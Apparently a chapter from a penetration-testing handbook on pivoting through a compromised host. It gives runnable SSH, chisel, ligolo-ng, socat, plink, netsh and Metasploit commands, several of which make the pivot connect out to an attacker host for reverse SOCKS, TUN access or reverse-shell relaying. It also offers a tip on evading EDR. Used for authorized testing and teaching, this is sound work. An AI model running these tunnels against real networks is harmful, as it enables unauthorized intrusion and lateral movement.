# 19 — Pivoting, Tunneling & Port Forwarding

Reach an internal network through a compromised host. Three primitives: **port forward** (one TCP port), **tunnel** (a session that carries multiple connections), and **VPN-style** access (full layer-3 reachability).

## Concepts

| Pattern | Direction | Use |
|---|---|---|
| Local forward (`-L`) | Attacker→Pivot→Internal | "Make `localhost:X` on me hit `<internal>:Y`" |
| Remote forward (`-R`) | Pivot→Attacker | "Make `pivot:X` deliver to `me:Y`" (callback / expose attacker svc inside) |
| Dynamic forward (`-D`) | SOCKS proxy | Generic per-connection forwarding via SOCKS |
| Reverse VPN | Pivot→Attacker | Pivot dials out to attacker; attacker gets a virtual interface to internal LAN |
| Bind tunnel | Attacker→Pivot | Attacker connects in to pivot's exposed port |

## SSH tunnels

When you have SSH on the pivot, this is usually all you need.

### Local forward — bring a remote port to your machine

```bash
# attacker → pivot:22 → 10.10.10.7:3389
ssh -N -L 13389:10.10.10.7:3389 user@pivot

# Now use 127.0.0.1:13389 from the attacker host
xfreerdp /u:Administrator /v:127.0.0.1:13389
```

### Remote forward — expose your local port on the pivot

```bash
# Anything that connects to pivot:8080 will hit attacker:80
ssh -N -R 8080:127.0.0.1:80 user@pivot

# Or expose a service on a third host through the pivot
ssh -N -R 9999:internal-db:5432 user@pivot
```

If the pivot's `sshd_config` has `GatewayPorts no` (default), `-R 8080:...` only listens on `127.0.0.1` of the pivot. Use `0.0.0.0:8080:...` if `GatewayPorts yes`.

### Dynamic forward — SOCKS5 through SSH

```bash
ssh -N -D 1080 user@pivot
# Then any tool with SOCKS support:
proxychains -q nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains -q curl http://internal/
firefox  # network settings → SOCKS5 127.0.0.1:1080
```

`-N` = no remote command; `-f` = backgrounds. Add `-o ServerAliveInterval=30 -o ServerAliveCountMax=3` for resilience.

### SSH options worth knowing

```
-i key            identity file
-p 2222           non-standard port
-J jump1,jump2    chain through hops (ProxyJump)
-o ProxyCommand   custom proxy command
-C                compression
-v / -vv          debug
```

Persistent multi-tunnel control via `~/.ssh/config`:

```
Host pivot
  HostName 10.10.10.5
  User alice
  IdentityFile ~/.ssh/id_rsa
  LocalForward 13389 10.10.10.7:3389
  DynamicForward 1080
  ServerAliveInterval 30
```

## sshuttle — quick layer-3 over SSH

Tunnel arbitrary TCP traffic to a target subnet without root on the pivot:

```bash
sshuttle -r user@pivot 10.10.10.0/24
sshuttle -r user@pivot 0/0                  # all
sshuttle -r user@pivot --dns 10.10.10.0/24  # also tunnel DNS
```

Behind the scenes it sets local iptables/PF rules and pipes traffic over SSH. Requires Python on the pivot.

## chisel — fast TCP/UDP over HTTP/WebSocket

Single Go binary. Useful when only HTTP egress is allowed.

```bash
# Server (attacker)
./chisel server -p 8080 --reverse --auth user:secret

# Client (compromised pivot)
./chisel client --auth user:secret http://attacker:8080 R:1080:socks   # reverse SOCKS
./chisel client --auth user:secret http://attacker:8080 R:13389:10.10.10.7:3389
```

After the SOCKS tunnel is up:

```bash
proxychains -q nmap -sT -Pn -p 22,80,445 10.10.10.0/24
```

Forward modes:

```
R:<remote-port>:<host>:<port>     # remote → expose internal target on attacker:remote-port
R:<remote-port>:socks             # SOCKS proxy on attacker
<local-port>:<host>:<port>         # local → attacker uses tunnel to reach <host>:<port>
```

## ligolo-ng — pivot via TUN interface (no SOCKS limits)

Cleanest pivot: client connects out, attacker gets a virtual `tun` interface routed at the target subnet. Works with any TCP/UDP/ICMP, including `nmap -sS`.

```bash
# Attacker (proxy)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Inside the proxy console:
session                                           # pick connected agent
start
ifconfig                                           # see remote interfaces
# Add the route, e.g.
sudo ip route add 10.10.10.0/24 dev ligolo
```

```bash
# Agent (compromised pivot)
./agent -connect attacker:11601 -ignore-cert
```

Now `nmap -sS 10.10.10.5` from the attacker just works.

## Socat — single-port relays

When you cannot run a tunnel daemon, a simple TCP relay on the pivot is enough.

```bash
# Pivot listens on 8443; forwards to internal:443
socat TCP-LISTEN:8443,reuseaddr,fork TCP:internal:443 &

# Pivot binds 4444; forwards back to attacker:4444 (reverse callback chaining)
socat TCP-LISTEN:4444,reuseaddr,fork TCP:attacker:4444 &
```

Combine with a reverse shell on the attacker side to relay through a DMZ host.

## proxychains / proxychains-ng

Wrap any tool to push its TCP through a SOCKS / HTTP proxy.

```ini
# /etc/proxychains.conf  or  /etc/proxychains4.conf
strict_chain
proxy_dns
quiet_mode
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains -q nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains -q ssh user@10.10.10.7
proxychains -q smbclient -L //10.10.10.7 -U alice
```

Notes:
- Use `nmap -sT -Pn` (full TCP connect, no host discovery) — SOCKS cannot pass raw SYNs.
- DNS via `proxy_dns` only works for hostnames the proxy can resolve.
- `proxychains-ng` (`proxychains4`) is the modern fork.

## Windows pivots

```cmd
:: plink — PuTTY's CLI SSH (Windows)
plink.exe -ssh -l user -pw Pass1 -D 1080 attacker
plink.exe -ssh -l user -pw Pass1 -L 13389:10.10.10.7:3389 attacker

:: netsh portproxy (no third-party binary)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.7 connectport=3389
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

Helpful for firewalls allowing inbound to the pivot but not to the internal target.

## Metasploit pivoting

```
# After getting a session
sessions -i 1
run autoroute -s 10.10.10.0/24
background

use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 80,443,445,3389
run

use auxiliary/server/socks_proxy           # default SOCKS5 1080
run -j

# Outside MSF
proxychains -q nmap -sT -Pn -p 80,443,445 10.10.10.0/24
```

`portfwd` from a Meterpreter shell exposes a single port locally:

```
portfwd add -l 13389 -p 3389 -r 10.10.10.7
portfwd flush
```

## Choosing the right tool

| Situation | Reach for |
|---|---|
| You have SSH on the pivot | SSH `-D 1080` or sshuttle |
| Only HTTPS outbound from pivot | chisel (HTTP), ligolo-ng (HTTPS) |
| Need raw IP / SYN scans / UDP | ligolo-ng (TUN) |
| Got a Meterpreter session | autoroute + socks_proxy |
| One specific port, no daemon | socat / netsh portproxy |
| Windows pivot, no installer rights | plink + portproxy |

## Detection considerations

- Long-lived outbound connections to non-standard ports stand out.
- HTTPS to attacker domains is normal-looking; HTTP plus high upload volume is not.
- chisel and ligolo agents are flagged by some EDR signatures — recompile from source for client work.
- Always log what you do (timestamps, ports, durations) — pivots are the most likely thing the blue team asks about post-engagement.

## Sources

- OpenSSH: https://man.openbsd.org/ssh
- chisel: https://github.com/jpillora/chisel
- ligolo-ng: https://github.com/nicocha30/ligolo-ng
- sshuttle: https://github.com/sshuttle/sshuttle
- proxychains-ng: https://github.com/rofl0r/proxychains-ng
- socat: https://www.dest-unreach.org/socat/doc/socat.html
